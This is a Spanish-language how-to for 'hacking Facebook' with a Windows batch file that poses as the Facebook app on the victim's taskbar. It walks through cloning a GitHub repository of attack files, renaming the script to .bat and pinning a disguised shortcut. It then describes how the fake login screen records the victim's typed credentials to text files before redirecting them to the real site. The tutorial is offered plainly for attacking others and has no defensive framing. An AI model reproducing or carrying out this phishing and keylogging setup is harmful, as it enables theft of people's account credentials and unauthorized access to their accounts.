Este es un metodo de como hackear Facebook usando un archivo Batch. Esto supone usar un ataque de phishing junto a la implementacion de un keylogger.

¿Que es el archivo Batch?


En Windows, el archivo por lotes (BATCH) es un archivo que almacena comandos en un orden en serie. El interprete de linea de comando toma el archivo como entrada y lo ejecuta en el mismo orden. Un archivo por lotes es simplemente un archivo de texto guardado con la extension de archivo .bat. Se puede escribir usando el Bloc de notas o cualquier otro editor de texto.

Preparar la trama


El truco consiste en establecer un acceso directo de la aplicacion de Facebook. Obviamente, no es la real; esta sera una interfaz del CMD que simulara ser un inicio de sesion para la plataforma social.

Entonces, la victima dara clic en el icono de Facebook que esta en la barra de tareas e intentara iniciar sesion. Todo lo que escriba sera grabado y almacenado en 2 archivos de texto. Posteriormente, la victima sera dirigida al navegador de tu eleccion junto con la URL de Facebook. 

                
                    git clone https://github.com/alexynior28/hack-batch-fb

Los archivos necesarios ya estan alojados en Github, puedes descargarlo desde aqui. Te explico en que consisten:

  • “Facebook.ico“: El icono de Facebook que se mostrara en la barra de tareas
  • “figletcmd.exe“: Personaliza las letras de la cabecera.
  • “Inicio_Sesion.txt“: El archivo BATCH. Debes modificar la extension .TXT por .BAT

La trama se ubicara en la barra de tareas. Entonces, crearemos un acceso directo para el archivo .BAT de la siguiente manera:

  • Clic derecho, crear acceso directo.
  • Escribir lo siguiente como ruta:
                
                    explorer C:\ubicacion\ruta\Hack_FB\Inicio_Sesion.bat




  • Arrastrar ese acceso directo a la barra de tareas.

Finalmente, todo esta preparado.

Recopilar credenciales de Facebook


El escenario es el siguiente: (no es el mejor ni el mas inteligente, pero es el siguiente al fin y al cabo)

  • La victima da clic en el acceso directo de la barra de tareas



  • Luego, elige una opcion para iniciar sesion o registrarse.



  • El programa le da la bienvenida. Aparentemente al pulsar una tecla todo estara bien.



  • Por ultimo, mostrara un error y redirigira a la victima a la web de Facebook abriendo el navegador instalado en el ordenador.
